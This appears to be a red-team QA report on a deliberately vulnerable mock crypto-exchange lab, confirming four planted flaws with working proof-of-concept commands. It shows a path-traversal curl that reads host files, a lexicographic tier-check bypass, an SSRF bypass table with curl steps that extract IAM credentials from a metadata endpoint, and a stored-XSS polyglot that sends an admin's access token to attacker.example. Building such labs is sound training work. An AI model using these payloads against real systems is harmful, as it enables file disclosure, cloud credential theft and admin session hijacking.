# Phase 2 — Adversarial QA (Gate 3)

> **Reviewer:** Red-team QA.
> **Date:** 2026-05-29
> **Verdict:** PASS. All 4 planted vulns confirmed exploitable.
> `pnpm tsx docs/phases/phase-2/poc-scratch.mjs` runs them
> end-to-end against real code. No unintended vulnerabilities
> surfaced during the unintended-probe sweep.

## Method

1. Static read of every Phase-2 source file: schema, migration,
   `lib/kyc-tier.ts`, `lib/kyc-storage.ts`, all user-facing and
   admin-facing route handlers, mock-imds, UI pages.
2. `pnpm tsx docs/phases/phase-2/poc-scratch.mjs` exercised
   `requireTier`, `mimeForFilename`, the SSRF guard, and the
   path-join traversal pattern. All four planted vulns fired.
3. Probed for unintended vulns (see § Unintended-probes).

## PoCs

### V-14 — Path traversal in KYC doc download

```bash
TOKEN=$(curl -s exchange.local/api/v2/auth/login \
  -H 'content-type: application/json' \
  -d '{"email":"user@example.test","password":"..."}' | jq -r .access)

# Read arbitrary process-readable files outside the uploads dir.
curl -i "exchange.local/api/v2/me/kyc/doc?file=../../../../../etc/hostname" \
  -H "authorization: Bearer $TOKEN"

# Useful targets for chain prep:
curl ... "?file=../../keys/legacy-2022"     # V-19/V-20 prep
curl ... "?file=../../../package.json"      # confirm webapp path
```

`poc-scratch.mjs` confirms the `join(UPLOADS_DIR, file)` pattern
without normalization resolves `../../secret-host-data` outside the
uploads root and `readFileSync` reads it.

### V-27 — Lexicographic KYC tier compare

```ts
requireTier({ kycTier: "3" }, "10");
// → returns silently (BUG); should have thrown
requireTier({ kycTier: "2" }, "10");
// → returns silently (BUG); should have thrown
```

Both demonstrated in `poc-scratch.mjs`. The function's signature
accepts `string | number` so any caller passing a string label
(Phase 4+ margin tiers) is at risk. Tier-3 user passes a tier-10
gate because `'3' > '1'` in lex compare.

### V-40 — SSRF guard bypass → mock IMDS → IAM creds

The handler in `apps/web/app/api/v2/me/kyc/import-url/route.ts`
guards only against the exact strings `localhost`, `127.0.0.1`,
`::1`. Confirmed bypasses (from `poc-scratch.mjs`):

| Hostname               | Guard         | Outcome                          |
|------------------------|---------------|----------------------------------|
| `0.0.0.0`              | passes        | reaches lab-local services       |
| `169.254.169.254`      | **passes**    | **reaches mock-imds**            |
| `2130706433`           | passes        | decimal-encoded 127.0.0.1        |
| `0x7f000001`           | passes        | hex 127.0.0.1                    |
| `017700000001`         | passes        | octal 127.0.0.1                  |
| `::ffff:127.0.0.1`     | passes        | IPv6-mapped 127.0.0.1            |
| `imds.bvbe.local`      | passes        | docker network alias for IMDS    |
| `bvbe-imds`            | passes        | service hostname                 |

End-to-end attack (against a running container):

```bash
# Step 1: get the IAM role name
curl -X POST exchange.local/api/v2/me/kyc/import-url \
  -H "authorization: Bearer $TOKEN" \
  -H 'content-type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","type":"address_proof"}'
# Server fetches IMDS → returns role name "bvbe-web-instance-role"

# Step 2: get the synthetic credentials
curl -X POST exchange.local/api/v2/me/kyc/import-url \
  -H "authorization: Bearer $TOKEN" \
  -H 'content-type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/bvbe-web-instance-role","type":"address_proof"}'
# Returns JSON: AccessKeyId AKIAIOSFODNN7EXAMPLE, SecretAccessKey ...
```

The retrieved credentials are stored as a KYC doc; download via
V-14 (`?file=...`) or via the legitimate `/api/v2/me/kyc/doc` to
read them back.

Phase 9 will land a mock S3 endpoint that accepts these credentials
to complete CHAIN D.

### V-41 — Polyglot upload → stored XSS in admin review

```bash
# Step 1: prepare a polyglot file. Any HTML works because the
# upload handler maps .html -> text/html in the stored mimeType.
cat > /tmp/address.html <<'HTML'
<script>
fetch("http://attacker.example/?t=" + encodeURIComponent(window.parent.localStorage["bvbe.access"]));
</script>
HTML

# Step 2: authenticate, upload as address_proof.
curl -X POST exchange.local/api/v2/me/kyc/documents \
  -H "authorization: Bearer $TOKEN" \
  -F "type=address_proof" \
  -F "file=@/tmp/address.html"

# Step 3: submit for review.
curl -X POST exchange.local/api/v2/me/kyc/submit \
  -H "authorization: Bearer $TOKEN"

# Step 4: admin@bvbe.local opens /admin/kyc/<userId>.
# The page authedFetches each doc, wraps response in a Blob with
# the stored mime (text/html), and sets blob URL as <iframe src>.
# The iframe loads as text/html in same origin -> script runs,
# reads window.parent.localStorage["bvbe.access"], exfiltrates.
```

Confirmed via `mimeForFilename` returning `"text/html"` for `.html`
extension and the admin doc-fetch handler echoing the stored mime
verbatim. Same-origin Blob URL preserves the mime type during
preview rendering.

## Unintended-vuln probes

| Probe                                                                | Result |
|----------------------------------------------------------------------|--------|
| Document download IDOR (user A reads user B's doc)                   | Clean — V-14 reads any *file*, but only authenticated callers; same-tier privilege; admin doc-fetch checks `doc.userId === userId` from URL. |
| Profile mass assignment (e.g., `kycTier`, `reviewedById`)            | Clean — zod schema is a strict object; only the 6 documented fields accepted. |
| Submit-for-review skips profile validation                           | Clean — handler checks `legalName`, `dateOfBirth`, `country` and rejects if any missing; also requires ≥1 document. |
| Approve endpoint accepts tier > 3 (privilege amplification)          | Clean — zod `min(1).max(3)`. |
| Reject endpoint accepts arbitrarily large reason (resource exhaustion) | Clean — zod `max(512)`. |
| URL-import follows infinite redirects                                | Acknowledged — `redirect: "follow"` is default. Realistic for V-40's purpose (redirect-to-internal bypass is part of the documented attack surface). |
| URL-import size check bypass                                         | Acknowledged — Content-Length header is honored if present, body re-checked after fetch. Cannot defeat both checks. |
| Mock-imds accidentally reachable from the host                       | Clean — no `ports:` mapping; internal docker network only. |
| Tier check in approve handler trusts client `tier` payload           | Acknowledged — admin endpoint, gated by middleware role check. Admin can set any tier 1-3 by design. |
| Stored XSS via `legalName` in admin review                           | The admin review page renders `view.profile?.legalName ?? "—"` as React text — auto-escaped. Clean. |
| Path traversal in stored filename leaking outside uploads dir        | Upload handler sanitises filename via `replace(/[^a-zA-Z0-9._-]/g, "_")` for the *stored* name, but stores the original in `filename`. The V-14 surface is the user-controlled `file` query param, not the stored name. Clean asymmetry. |

## Verdict

**PASS.** All 4 planted Phase-2 vulnerabilities confirmed
exploitable. CHAIN D landed its first concrete component (V-40).
CHAIN B got a second route (V-41 admin JWT theft via polyglot)
that pairs cleanly with V-35 from Phase 1. VULNS.md ledger
matches code 1:1.

— Adversarial QA
